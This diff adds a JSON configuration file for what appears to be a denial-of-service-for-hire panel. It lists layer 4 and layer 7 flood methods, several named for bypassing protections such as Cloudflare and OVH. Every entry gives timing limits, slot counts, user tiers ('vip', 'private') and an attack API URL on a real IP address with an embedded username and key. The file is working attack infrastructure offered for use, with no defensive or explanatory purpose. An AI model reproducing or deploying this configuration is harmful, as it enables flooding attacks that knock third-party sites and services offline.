@@ -1,0 +1,272 @@
+[
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udp",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+     "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udp-gb",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=udp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "udpbypass",
+    "group": "LAYER 4",
+    "defaultPort": 53,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=udpbypass"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "ovh",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "https",
+    "group": "LAYER 7",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=flood"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tls",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=flood"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "game",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+     "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=udpbypass"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tcp",
+    "group": "LAYER 4",
+    "defaultPort": 22,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=tcp"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "dns",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "pps",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tcpbypass",
+    "group": "LAYER 4",
+    "defaultPort": 22,
+    "defaultTime": 60,
+    "minTime": 1,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+    "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=tcpbypass"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "ovh",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "httpsbypass",
+    "group": "LAYER 4",
+    "defaultPort": 443,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+      "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method=browser-loaded"
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "tcpbypass",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "handshake",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "http-remedy",
+    "group": "LAYER 7",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": ["vip"],
+    "API": [
+      "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "cloudflare",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 60,
+    "minTime": 10,
+    "maxTime": 300,
+    "slots": 60,
+    "permission": [],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  },
+  {
+    "enabled": true,
+    "enabledWithFunnel": true,
+    "method": "hold",
+    "group": "LAYER 4",
+    "defaultPort": 80,
+    "defaultTime": 10,
+    "minTime": 60,
+    "maxTime": 900,
+    "slots": 2,
+    "permission": ["private"],
+    "API": [
+       "http://74.50.75.42:9090/api/attack?username=galaxia&key=1234&host=Host&port=Port&time=Time&method="
+    ]
+  }
+]
